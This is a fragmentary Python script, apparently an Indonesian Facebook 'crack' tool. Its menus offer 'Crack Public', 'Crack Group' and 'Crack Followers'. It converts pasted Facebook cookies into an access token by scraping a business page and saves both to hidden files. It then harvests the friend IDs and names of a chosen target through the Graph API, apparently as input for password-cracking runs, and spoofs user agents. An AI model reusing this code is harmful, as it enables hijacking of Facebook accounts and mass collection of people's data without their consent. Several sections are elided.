...
def back():
	cekTokenLogin()
#____ BANNER LHO.... ____
def banner():
	print('''\033[1;31m
  ▒█░▄▀ █▀▀█ █▀▀▀ █░░█ █░░█ █▀▀█ 
  \033[1;35m▒█▀▄░ █▄▄█ █░▀█ █░░█ █▄▄█ █▄▄█ 
  ▒█░▒█ ▀░░▀ ▀▀▀▀ ░▀▀▀ ▄▄▄█ ▀░░▀
    \033[1;36mAuthor :  Ryugen XD
    Github : https://github.com/ryugenxd
  \033[0m''')
balmond = O+"["+J+"•"+O+"]"
def metodeLogin():
  clear()
  ...
  print('_'*50)
  print(f'''
  \033[1;33m1.{h} Login With Token
  \033[1;33m2.{h} Login With Cookies
  \033[1;31m0.{h} Exit{x}
  ''')
  print('_'*50+'\n')
  pilih_method = input('選ぶ： ')
  if pilih_method in ['1','01']:
    login_token()
  elif pilih_method in ['2','02']:
    cekCookiesLogin()
  else:
    alr='# Baka...Bakka Ne Onichan'
    sol().print(mark(alr))
    exit()
#___ LOGIN COOKIES ___
def login_cookies():
  banner()
  xdg = '# MASUKAN COOKIES FACEBOOK'
  xdg1 = mark(xdg,style='green')
  sol().print(xdg1,style='red')
  neko = input(x+'['+p+'•'+x+'] Cookie Fb: ')
  try:
    set_url = 'https://business.facebook.com/business_locations'
    cookie = {'cookie':neko}
    hageryuke = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
    respon = requests.get(set_url,headers=hageryuke,cookies=cookie)
    token = re.search('(EAAG\w+)',respon.text).group(1)
    open('.token.txt','w').write(token)
    open('.cookie.txt','w').write(neko)
    cekCookiesLogin()
  except Exception as e:
    li = '# COOKIES EXPIRED OR ERROR CONNECTION'
    lo = mark(li,style='red')
    sol().print(lo,style='red')
    exit()
#___CEK COOKIES LOGIN____
def cekCookiesLogin():
  try:
    cookie = open('.cookie.txt','r').read()
    token = open('.token.txt','r').read()
    respon = requests.get(f'https://graph.facebook.com/me?access_token={token}',cookies={'cookie':cookie}).json()
    clear()
    menuCookies()
  except IOError:
    login_cookies()
#____CEK TOKEN LOGIN____
def cekTokenLogin():
		try:
			token = open('.token.txt','r').read()
...
#__MENU COOKIES___
def menuCookies():
  try:get_ip = requests.get('https://httpbin.org/ip').json()
  except:get_ip = {'origin':'-'}
  try:
  ...
  banner()
  alert_info = '# INFORMASI USER'
  tc = mark(alert_info, style='green')
  sol().print(tc)
  print(x+'['+h+'•'+x+'] \033[923mAlamat Ip    : '+str(get_ip['origin']))
  menu = """
  [01]. Crack Public 
  [02]. Crack Public (dump all)
  [03]. Crack Group
  [04]. Crack Followers
  [00]. Exit
  """
  suba = nel(menu,title='MENU')
  cetak(nel(suba,style='magenta'))
  subete = input(x+'['+p+'•'+x+'] SELECT: ')
  if subete in ['1','01']:
    dump_publik_Cookies()
  elif subete in ['0','00']:
    alert_rek = "# Bye bro "
    sol().print(mark(alert_rek,style='red'))
    exit()
  else:
    alert_rek = "# FITUR BELUM TERSEDIA"
    sol().print(mark(alert_rek,style='red'))
    exit()
	...
	if len(my_files)==0:
		...
		try:
			...
			try:
				...
				time.sleep(2)
				back()
#___DUMP Publik COOKIES__
def dump_publik_Cookies():
  token = open('.token.txt','r').read()
  my_kuki = open('.cookie.txt','r').read()
  notif = "# DUMP ID PUBLIK"
  sol().print(mark(notif,style='red'))
  print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
  target = input(x+'['+p+'x'+x+'] Masukkan ID Facebook : ')
  try:
    cek_out = requests.get(f'https://graph.facebook.com/{target}?fields=friends.fields(id,name,username)&access_token={token}',cookies={'cookie':my_kuki}).json()
    for data in cek_out['friends']['data']:
      try:
        id.append(f"{data['username']}|{data['name']}")
      except:
        id.append(f"{data['id']}|{data['name']}")
    print(x+'['+h+'•'+x+'] Total Pertemanan : '+str(len(id)))
    setting()
  except:
    notf = "# Error "
    sol().print(mark(notf,style='red'))
    exit()
#___DUMP PUBLIK TOKEN__
def dump_publik_Token():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
...
def useragent():
	...
	__orewa_ryugendesu__ = input('\n%s[%s+%s] Pilih :%s '%(P,M,P,H))
	uas(__orewa_ryugendesu__)
	
def uas(__orewa_ryugendesu__):
	if __orewa_ryugendesu__ == '':
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
		uas(__orewa_ryugendesu__)
	elif __orewa_ryugendesu__ in("1","01"):
		...
		menuToken()
	elif __orewa_ryugendesu__ in("2","02"):
		try:
			...
			ua_ = '%s-'%(M)
	elif __orewa_ryugendesu__ in("0","00"):
		menuToken()
	else:
